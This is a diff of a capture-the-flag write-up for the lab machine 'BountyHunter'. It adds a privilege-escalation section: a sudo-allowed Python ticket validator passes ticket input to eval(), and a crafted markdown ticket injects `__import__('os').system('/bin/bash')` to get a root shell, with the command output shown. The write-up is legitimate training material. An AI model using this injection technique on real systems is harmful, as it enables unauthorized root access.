@@ -130,7 +130,7 @@ usbmux:x:112:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin
 </table>
 ```
 
-#### Reading dp.php for Getting Credentials
+### XXE - Reading dp.php for Getting Credentials
 
 Exploit (xxe_exploit2.php)
 ```python
@@ -221,3 +221,106 @@ development@bountyhunter:~$ uname -a
 Linux bountyhunter 5.4.0-80-generic #90-Ubuntu SMP Fri Jul 9 22:49:44 UTC 2021 x86_64 x86_64 x86_64 GNU/Linux
 ```
 
+### user.txt
+
+```console
+development@bountyhunter:~$ cat user.txt 
+e4948**REDACTED**a7255
+```
+
+## Privesc (development --> root)
+
+```console
+development@bountyhunter:/var/www/html$ sudo -l
+Matching Defaults entries for development on bountyhunter:
+    env_reset, mail_badpass,
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+User development may run the following commands on bountyhunter:
+    (root) NOPASSWD: /usr/bin/python3.8 /opt/skytrain_inc/ticketValidator.py
+```
+
+`sudo -l` reveals that any user can run the `ticketValidator.py` script as `root`.
+
+```python
+development@bountyhunter:/opt/skytrain_inc$ cat ticketValidator.py 
+#Skytrain Inc Ticket Validation System 0.1
+#Do not distribute this file.
+
+def load_file(loc):
+    if loc.endswith(".md"):
+        return open(loc, 'r')
+    else:
+        print("Wrong file type.")
+        exit()
+
+def evaluate(ticketFile):
+    #Evaluates a ticket to check for ireggularities.
+    code_line = None
+    for i,x in enumerate(ticketFile.readlines()):
+        if i == 0:
+            if not x.startswith("# Skytrain Inc"):
+                return False
+            continue
+        if i == 1:
+            if not x.startswith("## Ticket to "):
+                return False
+            print(f"Destination: {' '.join(x.strip().split(' ')[3:])}")
+            continue
+
+        if x.startswith("__Ticket Code:__"):
+            code_line = i+1
+            continue
+
+        if code_line and i == code_line:
+            if not x.startswith("**"):
+                return False
+            ticketCode = x.replace("**", "").split("+")[0]
+            if int(ticketCode) % 7 == 4:
+                validationNumber = eval(x.replace("**", ""))
+                if validationNumber > 100:
+                    return True
+                else:
+                    return False
+    return False
+
+def main():
+    fileName = input("Please enter the path to the ticket file.\n")
+    ticket = load_file(fileName)
+    #DEBUG print(ticket)
+    result = evaluate(ticket)
+    if (result):
+        print("Valid ticket.")
+    else:
+        print("Invalid ticket.")
+    ticket.close
+
+main()
+```
+
+By reviewing the above code, we can leverage this to escalate our privilege to `root`:
+* Since the script is taking any file (or ticket named `.md`), we can create a valid ticket.
+* `eval()` function can be used to execute an arbitrary python code as `root`
+
+Create the following `.md` ticket file:
+
+```md
+development@bountyhunter:/opt/skytrain_inc$ cat /tmp/test.md 
+# Skytrain Inc
+## Ticket to bigb0ss
+__Ticket Code:__
+**11+ __import__('os').system('/bin/bash')
+```
+
+### root.txt
+
+```console
+development@bountyhunter:/opt/skytrain_inc$ sudo /usr/bin/python3.8 /opt/skytrain_inc/ticketValidator.py
+Please enter the path to the ticket file.
+/tmp/test.md
+Destination: bigb0ss
+root@bountyhunter:/opt/skytrain_inc# id
+uid=0(root) gid=0(root) groups=0(root)
+root@bountyhunter:/opt/skytrain_inc# cat /root/root.txt 
+b305**REDACTED**6178
+```
